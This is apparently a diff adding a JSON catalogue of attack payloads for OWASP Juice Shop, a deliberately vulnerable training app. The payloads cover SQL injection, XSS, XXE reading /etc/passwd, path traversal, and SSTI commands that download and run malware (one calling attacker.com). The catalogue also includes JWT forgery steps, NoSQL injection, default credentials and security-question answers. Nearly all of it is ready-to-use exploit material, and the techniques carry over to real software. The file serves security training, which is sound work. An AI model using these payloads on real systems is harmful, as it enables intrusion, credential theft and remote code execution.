@@ -1,0 +1,738 @@
+{
+  "metadata": {
+    "version": "2.0.0",
+    "source": "OWASP Juice Shop Companion Guide",
+    "url": "https://pwning.owasp-juice.shop/companion-guide/latest/",
+    "total_challenges": 80,
+    "difficulty_levels": ["⭐", "⭐⭐", "⭐⭐⭐", "⭐⭐⭐⭐", "⭐⭐⭐⭐⭐", "⭐⭐⭐⭐⭐⭐"],
+    "created": "2025-01-31",
+    "description": "Real-world attack patterns extracted from 80+ Juice Shop challenges"
+  },
+
+  "sqli": {
+    "description": "SQL Injection payloads proven to work on Juice Shop (SQLite backend)",
+    "category": "WSTG-INPV-05",
+    "severity": "critical",
+    
+    "login_bypass": [
+      {
+        "payload": "' or 1=1--",
+        "target": "login email field",
+        "description": "Generic admin bypass",
+        "difficulty": "⭐⭐",
+        "challenge": "Login Admin"
+      },
+      {
+        "payload": "admin@juice-sh.op'--",
+        "target": "login email field",
+        "description": "Specific user bypass (admin)",
+        "difficulty": "⭐⭐",
+        "challenge": "Login Admin"
+      },
+      {
+        "payload": "bender@juice-sh.op'--",
+        "target": "login email field",
+        "description": "Specific user bypass (Bender)",
+        "difficulty": "⭐⭐",
+        "challenge": "Login Bender"
+      },
+      {
+        "payload": "\\' or deletedAt IS NOT NULL--",
+        "target": "login email field",
+        "description": "Deleted user login (Chris)",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Login Chris"
+      },
+      {
+        "payload": "chris.pike@juice-sh.op'--",
+        "target": "login email field",
+        "description": "Specific deleted user bypass",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Login Chris"
+      }
+    ],
+
+    "union_based": [
+      {
+        "payload": "')) UNION SELECT id, email, password, null, null, null, null, null, null FROM Users--",
+        "target": "/rest/products/search?q=",
+        "description": "Extract all user credentials (9 columns)",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Database Schema",
+        "columns_required": 9,
+        "extracted_data": "user emails, MD5 password hashes"
+      },
+      {
+        "payload": "')) UNION SELECT id, email, password, totpsecret, null, null, null, null, null FROM Users--",
+        "target": "/rest/products/search?q=",
+        "description": "Extract TOTP secrets for 2FA bypass (wurstbrot)",
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "Login Wurstbrot",
+        "extracted_data": "TOTP secret: IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"
+      },
+      {
+        "payload": "')) UNION SELECT sql, null, null, null, null, null, null, null, null FROM sqlite_master--",
+        "target": "/rest/products/search?q=",
+        "description": "Extract database schema (CREATE TABLE statements)",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Database Schema",
+        "extracted_data": "Full CREATE TABLE statements"
+      },
+      {
+        "payload": "'))--",
+        "target": "/rest/products/search?q=",
+        "description": "Bypass product filter (shows deleted products)",
+        "difficulty": "⭐⭐",
+        "challenge": "Christmas Special",
+        "extracted_data": "Christmas Special 2014 (ProductId=10, deleted)"
+      }
+    ],
+
+    "error_based": [
+      {
+        "payload": "'",
+        "target": "/rest/products/search?q=",
+        "description": "Trigger SQLITE_ERROR to reveal query structure",
+        "difficulty": "⭐",
+        "challenge": "Error Handling",
+        "expected_error": "SQLITE_ERROR: syntax error"
+      },
+      {
+        "payload": "')) UNION SELECT null--",
+        "target": "/rest/products/search?q=",
+        "description": "Column count enumeration",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "Database Schema",
+        "expected_error": "SELECTs to the left and right of UNION do not have the same number of result columns"
+      }
+    ],
+
+    "blind_sqli": [
+      {
+        "payload": "' AND SUBSTRING((SELECT password FROM Users WHERE email='admin@juice-sh.op'),1,1)='0'--",
+        "target": "login email field",
+        "description": "Character-by-character password extraction",
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "Advanced SQLi"
+      }
+    ]
+  },
+
+  "xss": {
+    "description": "Cross-Site Scripting payloads proven to work on Juice Shop",
+    "category": "WSTG-INPV-01/02",
+    "severity": "high",
+
+    "dom_xss": [
+      {
+        "payload": "<iframe src=\"javascript:alert('xss')\">",
+        "target": "/#/search?q=",
+        "description": "Search field DOM XSS",
+        "difficulty": "⭐",
+        "challenge": "DOM XSS"
+      },
+      {
+        "payload": "<iframe src=\"javascript:alert(`xss`)\">",
+        "target": "/#/track-result?id=",
+        "description": "Track order reflected XSS",
+        "difficulty": "⭐",
+        "challenge": "Reflected XSS"
+      },
+      {
+        "payload": "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true\"></iframe>",
+        "target": "/#/search?q=",
+        "description": "XSS with sound (Soundcloud embed)",
+        "difficulty": "⭐⭐",
+        "challenge": "Bonus Payload"
+      }
+    ],
+
+    "stored_xss": [
+      {
+        "payload": "<<script>Foo</script>iframe src=\"javascript:alert(`xss`)\">",
+        "target": "POST /api/Feedbacks (comment field)",
+        "description": "Sanitizer bypass (sanitize-html 1.4.2 bug)",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "API-only XSS",
+        "bypass_technique": "Removes inner <script> first: <<script>Foo</script>iframe> → <iframe>"
+      },
+      {
+        "payload": "<iframe src=\"javascript:alert('xss')\">",
+        "target": "POST /api/Users (email field via Burp/curl)",
+        "description": "Client-side validation bypass",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "API-only XSS",
+        "trigger": "Visit /#/administration → XSS fires in user table"
+      },
+      {
+        "payload": "<iframe src=\"javascript:alert('xss')\">",
+        "target": "POST /api/Products (description field)",
+        "description": "Server-side XSS (requires admin JWT)",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Server-side XSS",
+        "prerequisites": "Admin JWT token"
+      },
+      {
+        "payload": "<iframe src=\"javascript:alert('xss')\">",
+        "target": "POST /rest/saveLoginIp (True-Client-IP header)",
+        "description": "HTTP header injection XSS",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "HTTP-header XSS",
+        "trigger": "Visit /#/privacy-security/last-login-ip"
+      }
+    ],
+
+    "csp_bypass": [
+      {
+        "payload": "https://a.png; script-src 'unsafe-inline' 'self'",
+        "target": "Profile Image URL field",
+        "description": "CSP header injection via Image URL",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "CSP Bypass",
+        "step2": "Set Username to: <<a|ascript>alert('xss')</script>"
+      }
+    ],
+
+    "advanced_xss": [
+      {
+        "payload": "</script><script>alert('xss')</script>",
+        "target": "owasp_promo.vtt (video subtitle file)",
+        "description": "Zip Slip + Subtitle XSS",
+        "difficulty": "⭐⭐⭐⭐⭐⭐",
+        "challenge": "Video Subtitle XSS",
+        "exploitation": "1. Create owasp_promo.vtt, 2. Zip Slip: zip exploit.zip ../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt, 3. Upload via /#/complain, 4. Visit /#/promotion"
+      }
+    ]
+  },
+
+  "xxe": {
+    "description": "XML External Entity injection payloads",
+    "category": "WSTG-INPV-07",
+    "severity": "critical",
+
+    "file_read": [
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><trades><metadata><name>Apple Juice</name><trader><foo>&xxe;</foo></trader></metadata></trades>",
+        "target": "/#/complain (File Complaint - XML upload)",
+        "description": "Read /etc/passwd (Linux)",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "XXE Data Access"
+      },
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///C:/Windows/system.ini\" >]><trades><metadata><name>Apple Juice</name><trader><foo>&xxe;</foo></trader></metadata></trades>",
+        "target": "/#/complain (File Complaint - XML upload)",
+        "description": "Read system.ini (Windows)",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "XXE Data Access"
+      },
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///app/frontend/dist/frontend/index.html\" >]><trades><metadata><name>Apple Juice</name><trader><foo>&xxe;</foo></trader></metadata></trades>",
+        "target": "/#/complain (File Complaint - XML upload)",
+        "description": "Read application files",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "XXE Data Access"
+      }
+    ],
+
+    "dos_attack": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">]><lolz>&lol2;</lolz>",
+        "target": "/#/complain (File Complaint - XML upload)",
+        "description": "Billion Laughs DoS (BLOCKED)",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "XXE DoS",
+        "expected_result": "410 Error - Protection detected entity reference loop"
+      }
+    ]
+  },
+
+  "lfi": {
+    "description": "Local File Inclusion / Path Traversal payloads",
+    "category": "WSTG-INPV-11/14",
+    "severity": "high",
+
+    "poison_null_byte": [
+      {
+        "payload": "/ftp/package.json.bak%2500.adoc",
+        "target": "/ftp/{filename}",
+        "description": "Bypass .adoc/.pdf extension filter",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Poison Null Byte",
+        "explanation": "%25 = URL-encoded %, %00 = null byte tricks filter"
+      },
+      {
+        "payload": "/ftp/coupons_2013.adoc.bak%2500.adoc",
+        "target": "/ftp/{filename}",
+        "description": "Download backup file with coupons",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Forgotten Sales Backup"
+      },
+      {
+        "payload": "/ftp/eastere.gg%2500.adoc",
+        "target": "/ftp/{filename}",
+        "description": "Download easter egg file",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Easter Egg"
+      },
+      {
+        "payload": "/ftp/suspicious_errors.yml%2500.adoc",
+        "target": "/ftp/{filename}",
+        "description": "Download SIEM signatures",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Error Handling"
+      },
+      {
+        "payload": "/ftp/incident-support.kdbx%2500.adoc",
+        "target": "/ftp/{filename}",
+        "description": "Download KeePass database",
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "Confidential Document"
+      }
+    ],
+
+    "ssti_file_read": [
+      {
+        "payload": "#{global.process.mainModule.require('fs').readFileSync('/etc/passwd', 'utf-8')}",
+        "target": "Profile Username field",
+        "description": "Read files via SSTI",
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "SSTI"
+      }
+    ]
+  },
+
+  "ssrf": {
+    "description": "Server-Side Request Forgery payloads",
+    "category": "WSTG-INPV-19",
+    "severity": "critical",
+
+    "internal_access": [
+      {
+        "payload": "http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3",
+        "target": "Profile Gravatar URL field",
+        "description": "Access internal endpoints via SSRF",
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "SSRF"
+      }
+    ],
+
+    "ssti_ssrf": [
+      {
+        "payload": "#{global.process.mainModule.require('child_process').exec('wget http://attacker.com/malware && chmod +x malware && ./malware')}",
+        "target": "Profile Username field",
+        "description": "SSRF + RCE via SSTI",
+        "difficulty": "⭐⭐⭐⭐⭐⭐",
+        "challenge": "RCE"
+      }
+    ]
+  },
+
+  "ssti": {
+    "description": "Server-Side Template Injection (Pug) payloads",
+    "category": "WSTG-INPV-18",
+    "severity": "critical",
+
+    "test_payloads": [
+      {
+        "payload": "#{1+1}",
+        "target": "Profile Username field",
+        "description": "Test for SSTI (should show '2')",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "SSTI Detection"
+      }
+    ],
+
+    "rce_payloads": [
+      {
+        "payload": "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
+        "target": "Profile Username field",
+        "description": "RCE - Download & execute malware (Linux)",
+        "difficulty": "⭐⭐⭐⭐⭐⭐",
+        "challenge": "RCE",
+        "os": "Linux"
+      },
+      {
+        "payload": "#{global.process.mainModule.require('child_process').exec('powershell -Command \"Invoke-WebRequest -Uri https://github.com/J12934/juicy-malware/blob/master/juicy_malware_windows_64.exe?raw=true -OutFile malware.exe; ./malware.exe\"')}",
+        "target": "Profile Username field",
+        "description": "RCE - Download & execute malware (Windows)",
+        "difficulty": "⭐⭐⭐⭐⭐⭐",
+        "challenge": "RCE",
+        "os": "Windows"
+      }
+    ],
+
+    "chatbot_vm_escape": [
+      {
+        "payload": "admin\"); process.mainModule.require('child_process').exec('...'); users.addUser(\"1337\", \"test",
+        "target": "Chatbot username input",
+        "description": "Escape Juicy Chat Bot VM",
+        "difficulty": "⭐⭐⭐⭐⭐⭐",
+        "challenge": "Chatbot VM Escape"
+      }
+    ]
+  },
+
+  "nosql_injection": {
+    "description": "NoSQL Injection payloads (MongoDB)",
+    "category": "WSTG-INPV-05",
+    "severity": "critical",
+
+    "where_clause_bypass": [
+      {
+        "payload": "' || true || '",
+        "target": "/rest/track-order/{orderId}",
+        "description": "MongoDB $where bypass (returns ALL orders)",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "NoSQL Injection",
+        "explanation": "Query becomes: { $where: \"orderId === '' || true || ''\" }"
+      }
+    ],
+
+    "update_many": [
+      {
+        "payload": "{\"id\": { \"$ne\": -1 }, \"message\": \"NoSQL Injection!\"}",
+        "target": "PATCH /rest/products/reviews",
+        "description": "Update ALL reviews (mass assignment)",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "NoSQL Injection",
+        "method": "PATCH",
+        "content_type": "application/json"
+      }
+    ],
+
+    "dos_attack": [
+      {
+        "payload": "/rest/products/sleep(2000)/reviews",
+        "target": "/rest/products/{id}/reviews",
+        "description": "DoS via sleep() (capped to prevent real DoS)",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "NoSQL DoS"
+      }
+    ]
+  },
+
+  "hpp": {
+    "description": "HTTP Parameter Pollution",
+    "category": "WSTG-INPV-04",
+    "severity": "high",
+
+    "basket_manipulation": [
+      {
+        "payload": "{\"ProductId\": 14, \"BasketId\": \"1\", \"quantity\": 1, \"BasketId\": \"2\"}",
+        "target": "POST /api/BasketItems",
+        "description": "Add product to victim's basket (duplicate BasketId params)",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "Manipulate Basket",
+        "explanation": "First BasketId passes validation, second BasketId is actual target"
+      }
+    ]
+  },
+
+  "authentication": {
+    "description": "Authentication bypass techniques",
+    "category": "WSTG-ATHN",
+    "severity": "critical",
+
+    "default_credentials": [
+      {
+        "username": "admin@juice-sh.op",
+        "password": "admin123",
+        "password_hash": "0192023a7bbd73250516f069df18b500",
+        "hash_type": "MD5",
+        "difficulty": "⭐⭐",
+        "challenge": "Login Admin"
+      },
+      {
+        "username": "jim@juice-sh.op",
+        "password": "ncc-1701",
+        "reference": "Star Trek USS Enterprise registry number",
+        "difficulty": "⭐⭐",
+        "challenge": "Login Jim"
+      },
+      {
+        "username": "mc.safesearch@juice-sh.op",
+        "password": "Mr. N00dles",
+        "reference": "From MC SafeSearch music video",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "Login MC SafeSearch"
+      },
+      {
+        "username": "support@juice-sh.op",
+        "password": "Support2022!",
+        "source": "KeePass DB: incident-support.kdbx (master password: J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P)",
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "Login Support Team"
+      }
+    ],
+
+    "security_questions": [
+      {
+        "user": "bjoern@juice-sh.op",
+        "question": "Name of your favorite pet?",
+        "answer": "Zaya",
+        "source": ["Twitter: @bkimminich (photos)", "YouTube: BeNeLux Day 2018 talk (3:59)", "GitHub README"],
+        "difficulty": "⭐⭐⭐",
+        "challenge": "Password Reset Bjoern"
+      },
+      {
+        "user": "jim@juice-sh.op",
+        "question": "Your eldest siblings middle name?",
+        "answer": "Samuel",
+        "source": "Star Trek: Jim = James T. Kirk → Brother = George Samuel Kirk",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "Password Reset Jim"
+      },
+      {
+        "user": "emma@juice-sh.op",
+        "question": "Company you first worked for as an adult?",
+        "answer": "ITsec",
+        "source": "Photo wall upload shows ITsec logo on building",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Password Reset Emma"
+      },
+      {
+        "user": "john@juice-sh.op",
+        "question": "Sibling-related question",
+        "answer": "Derived from EXIF GPS coordinates",
+        "source": "Download photo from Photo Wall, run: exiftool john-photo.jpg",
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "Password Reset John"
+      },
+      {
+        "user": "morty@juice-sh.op",
+        "question": "Name of your favorite pet?",
+        "answer": "Snowball (leet speak variations: 5N0wb41L, etc.)",
+        "source": "Brute-force with Rick & Morty wordlist",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Password Reset Morty"
+      }
+    ],
+
+    "jwt_attacks": [
+      {
+        "type": "algorithm_confusion",
+        "description": "RS256 → HS256 signature forgery",
+        "steps": [
+          "1. Download /encryptionkeys/jwt.pub",
+          "2. Change header: {\"alg\":\"HS256\"}",
+          "3. Modify payload: {\"email\":\"rsa_lord@juice-sh.op\"}",
+          "4. Sign with PUBLIC key as HMAC secret",
+          "5. Format: base64url(header).base64url(payload).base64url(HMAC_SHA256(data, pubkey))"
+        ],
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "Login RSA Lord"
+      },
+      {
+        "type": "none_algorithm_bypass",
+        "description": "Remove signature with alg: 'none'",
+        "steps": [
+          "1. Set header: {\"alg\":\"none\"}",
+          "2. Modify payload: {\"email\":\"jwtn3d@juice-sh.op\"}",
+          "3. Remove signature: header.payload. (note trailing dot!)"
+        ],
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "Login JWT None"
+      }
+    ],
+
+    "oauth_bypass": [
+      {
+        "description": "Google OAuth default password vulnerability",
+        "exploitation": [
+          "1. Analyze main.js: search for 'oauth'",
+          "2. Find: oauthLogin() → userService.save(email, password=\"google default\")",
+          "3. Default password pattern: base64-encode(email)",
+          "4. Login: bjoern.kimminich@googlemail.com / <base64_default>"
+        ],
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Login via OAuth"
+      }
+    ],
+
+    "2fa_bypass": [
+      {
+        "user": "wurstbrot@juice-sh.op",
+        "description": "TOTP secret extraction via SQLi",
+        "steps": [
+          "1. SQLi: /rest/products/search?q=')) UNION SELECT id, email, password, totpsecret, null, null, null, null, null FROM Users--",
+          "2. Extract secret: IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH",
+          "3. Setup Google Authenticator with secret",
+          "4. Login: wurstbrot@juice-sh.op'-- → Enter TOTP from app"
+        ],
+        "difficulty": "⭐⭐⭐⭐⭐",
+        "challenge": "Login Wurstbrot (2FA)"
+      }
+    ]
+  },
+
+  "file_upload": {
+    "description": "File upload vulnerabilities",
+    "category": "Multiple",
+    "severity": "critical",
+
+    "zip_slip": [
+      {
+        "description": "Overwrite application files via Zip Slip",
+        "steps": [
+          "1. Create malicious file (e.g., owasp_promo.vtt with XSS payload)",
+          "2. Create Zip: zip exploit.zip ../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt",
+          "3. Upload via /#/complain (File Complaint form)",
+          "4. Trigger: Visit /#/promotion → XSS fires"
+        ],
+        "difficulty": "⭐⭐⭐⭐⭐⭐",
+        "challenge": "Overwrite Video Subtitle"
+      }
+    ],
+
+    "xxe_upload": [
+      {
+        "description": "Upload malicious XML with XXE payload",
+        "file_type": "XML",
+        "payload": "See xxe.file_read section",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "XXE Data Access"
+      }
+    ]
+  },
+
+  "business_logic": {
+    "description": "Business logic vulnerabilities",
+    "category": "WSTG-BUSL",
+    "severity": "medium",
+
+    "negative_quantity": [
+      {
+        "payload": "{\"ProductId\": 8, \"BasketId\": \"1\", \"quantity\": -100}",
+        "target": "POST /api/BasketItems",
+        "description": "Order negative quantity to get PAID instead of paying",
+        "difficulty": "⭐⭐⭐",
+        "challenge": "Payback Time"
+      }
+    ],
+
+    "deleted_product_order": [
+      {
+        "payload": "{\"ProductId\": 10, \"BasketId\": \"1\", \"quantity\": 1}",
+        "target": "POST /api/BasketItems",
+        "description": "Order Christmas Special 2014 (deleted product)",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Christmas Special",
+        "prerequisite": "Find ProductId=10 via SQLi: /rest/products/search?q='))--"
+      }
+    ],
+
+    "five_star_feedback": [
+      {
+        "description": "Remove 5-star feedback",
+        "steps": [
+          "1. Find 5-star feedback ID via SQLi",
+          "2. DELETE /api/Feedbacks/{id} (requires auth)"
+        ],
+        "difficulty": "⭐⭐",
+        "challenge": "Five Star Feedback"
+      }
+    ]
+  },
+
+  "open_redirect": {
+    "description": "Open Redirect vulnerabilities",
+    "category": "WSTG-CLNT-04",
+    "severity": "medium",
+
+    "whitelist_bypass": [
+      {
+        "payload": "/redirect?to=http://evil.com?pwned=https://github.com/juice-shop",
+        "target": "/redirect?to=",
+        "description": "Bypass allowlist via query parameter injection",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Whitelist Bypass",
+        "explanation": "indexOf() checks if URL contains whitelisted domain, inject as parameter"
+      },
+      {
+        "payload": "/redirect?to=http://evil.com#https://github.com/juice-shop",
+        "target": "/redirect?to=",
+        "description": "Bypass allowlist via fragment",
+        "difficulty": "⭐⭐⭐⭐",
+        "challenge": "Whitelist Bypass"
+      }
+    ]
+  },
+
+  "hidden_endpoints": {
+    "description": "Hidden endpoints discovered in Juice Shop",
+    "category": "WSTG-INFO-06",
+    "severity": "info",
+
+    "critical_paths": [
+      "/ftp",
+      "/ftp/legal.md",
+      "/ftp/acquisitions.md",
+      "/metrics",
+      "/#/score-board",
+      "/#/administration",
+      "/rest/products/search",
+      "/api/Challenges",
+      "/assets/public/images/uploads/",
+      "/web3-sandbox",
+      "/tokensale-ico-ea",
+      "/.well-known/security.txt",
+      "/encryptionkeys/",
+      "/encryptionkeys/jwt.pub",
+      "/support/logs",
+      "/support/logs/access.log"
+    ]
+  },
+
+  "testing_checklists": {
+    "description": "Comprehensive testing checklists for each category",
+    
+    "reconnaissance": [
+      "Enumerate subdomains (subfinder, crt.sh)",
+      "Fingerprint technology (WhatWeb, Wappalyzer)",
+      "Check meta files (robots.txt, sitemap.xml, security.txt)",
+      "Mine JavaScript for hidden routes (search main.js for 'path:', 'resolve:')",
+      "Test common paths (/ftp, /metrics, /api, /rest, /.well-known)",
+      "Attempt auto-login (default creds, SQLi bypass)",
+      "Trigger error to reveal stack trace (/rest/qwertz)",
+      "Extract JWT algorithm and public key (/encryptionkeys/jwt.pub)"
+    ],
+
+    "authentication": [
+      "Test SQL injection on login (' or 1=1--, admin@juice-sh.op'--)",
+      "Try default credentials (admin123, ncc-1701, Mr. N00dles)",
+      "Test password reset security questions (Zaya, Samuel, ITsec)",
+      "Test JWT algorithm confusion (RS256→HS256)",
+      "Test JWT 'none' algorithm bypass",
+      "Test OAuth default password vulnerability",
+      "Extract TOTP secrets via SQLi for 2FA bypass",
+      "Test account enumeration (response differences)",
+      "Test weak password policy (single char passwords)",
+      "Test admin registration via mass assignment (role: 'admin')",
+      "Test session fixation"
+    ],
+
+    "input_validation": [
+      "Test DOM XSS in search (?q=<iframe src=\"javascript:alert('xss')\">)",
+      "Test stored XSS in feedback (<<script>Foo</script>iframe...)",
+      "Test SQL injection in search (?q='))",
+      "Test SQL injection login bypass (' or 1=1--)",
+      "Test XXE in XML upload (<!ENTITY xxe SYSTEM \"file:///etc/passwd\">)",
+      "Test LFI with Poison Null Byte (%2500.adoc)",
+      "Test SSRF in Gravatar URL (http://localhost:3000/...)",
+      "Test SSTI in profile (#{1+1})",
+      "Test NoSQL injection in track order (' || true || ')",
+      "Test HTTP Parameter Pollution (duplicate BasketId)",
+      "Test CSP bypass (Image URL CSP injection)",
+      "Test Zip Slip file upload"
+    ],
+
+    "business_logic": [
+      "Test negative quantity orders",
+      "Test ordering deleted products (ProductId=10)",
+      "Test basket manipulation (HPP)",
+      "Test deleting 5-star feedback",
+      "Test price manipulation",
+      "Test coupon code bypass"
+    ]
+  }
+}
